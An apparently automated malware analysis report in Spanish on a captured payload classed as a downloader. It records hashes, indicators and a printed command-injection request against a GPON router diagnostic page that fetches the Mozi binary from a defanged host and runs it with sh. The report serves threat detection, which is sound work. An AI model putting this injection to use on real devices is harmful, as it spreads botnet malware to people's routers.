# 🧬 Payload Analysis

`8a1ea8e2dd5052b77820631c7211ec0aceafd4742796966c8f699784926de424`

## 📌 Resumen

Texto ASCII de 138 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.m+-O+-` en `hxxp://139.135.40.XXX:59501/Mozi.m+-O+-`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://139.135.40.XXX:59501/Mozi.m -O ->/tmp/gpon80`
2. `sh` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/8a1ea8e2dd5052b77820631c7211ec0aceafd4742796966c8f699784926de424.md](../../../../../malware-like/oraculo/downloader/8a1ea8e2dd5052b77820631c7211ec0aceafd4742796966c8f699784926de424.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:36:21.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `8a1ea8e2dd5052b77820631c7211ec0aceafd4742796966c8f699784926de424`
- **SHA1:** `8e20e54f1a20cc4535e81a938498f3d670719974`
- **MD5:** `ec5750027905d02d5db8e61cfef41366`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 138 B |
| Entropía | 5.1 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://139.135.40.XXX:59501/Mozi.m+-O+->/tmp/gpon80;sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://139.135.40.XXX:59501/Mozi.m+-O+- | strings |
| ip | 139.135.40.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://139.135.40.XXX:59501/Mozi.m+-O+->/tmp/gpon80;sh | strings |
| hash | 8a1ea8e2dd5052b77820631c7211ec0aceafd4742796966c8f699784926de424 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
